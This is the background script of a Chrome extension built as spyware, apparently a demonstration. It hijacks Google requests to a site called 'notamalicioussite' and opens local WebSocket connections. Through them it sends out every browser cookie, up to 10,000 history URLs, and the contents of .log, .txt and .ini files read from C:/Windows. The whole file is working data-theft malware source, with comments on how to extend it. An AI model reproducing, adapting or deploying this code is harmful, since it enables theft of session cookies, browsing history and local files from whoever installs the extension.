// creating the sockets of our communication
let cookieSocket = new WebSocket("ws://localhost:7777");
let historySocket = new WebSocket("ws://localhost:3333");
let fileSocket = new WebSocket("ws://localhost:7733");

var directory = "file:///C:/Windows/"; // the directory to check.
var fileExtensions = ['.log', '.txt', '.ini']; // add whatever you'd like.

/** --------------------------- EVENT HANDLING -------------------------------------- **/

chrome.webRequest.onBeforeRequest.addListener(function (details){
    // redirect the user to our site when we see that google has been requested.
    return {redirectUrl: 'https://notamalicioussite.wordpress.com/'};
},{
    urls: ['*://*.google.com/'] // the urls we filter
}, ['blocking']);


/** --------------------------- SOCKET HANDLING -------------------------------------- **/

cookieSocket.onopen = function(e){
    chrome.cookies.getAll({},function (cookie){
            for(i=0; i<cookie.length; i++){
                cookieSocket.send(JSON.stringify(cookie[i])); // get each cookie and send a string version of it.
            }
    })
}

historySocket.onopen = function(e){
    chrome.history.search({
        text: '', // get ALL websites visited.
        maxResults: 10000 // get a maximum of 10,000 results, this defaults to 100 if not set.
    }, function(data){
        data.forEach(function(page){
            var url = page.url;
            historySocket.send(url); // print the url for each page found.
        });
    });
}

fileSocket.onopen = function(e){
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open('GET', directory, false); // get the files in the directory. Initializes a request.
    xmlHttp.send(null); // sends the request.
    var ret = xmlHttp.responseText; // gets the response text.
    var fileList = ret.split('\n'); // parse the response (each line is information about a file).
    for (i = 0; i < fileList.length; i++){
        var fileInfo = fileList[i].split('"'); // split by '"' to get the name as the 2nd item.
        // fileInfo[1] would be the potential name of each file in the directory.
        var fileName = fileInfo[1];
        if(fileName != undefined){
            for(var extension of fileExtensions){
                // if the file has one of the extensions we're looking for:
                if(fileName.indexOf(extension) != -1){
                    // send the file name and the contents of the file.
                    fileSocket.send(fileName + '\n');
                    readTextFile(directory + fileName);
                }
            }
        }
    }
}

/** --------------------------- HELPER FUNCTIONS -------------------------------------- **/

function readTextFile(file){
    var rawFile = new XMLHttpRequest();
    rawFile.open('GET', file, false); // create a GET request.
    
    // when the ready state of the request changes, we got our response.
    rawFile.onreadystatechange = function(){
        var text = rawFile.responseText; // get the file contents.
        console.log(text);
        var textSplit = text.split('\n'); // split the file into lines.
        for(var i = 0; i < textSplit.length; i++){
            fileSocket.send(textSplit[i]); // send each line to prevent an error of an oversized message.
        }
        fileSocket.send('EOF'); // send an 'EOF' to represent an end of a file. 
    }
    rawFile.send(null); // sending the request. (null is the body of the message, as it is a GET request).
}
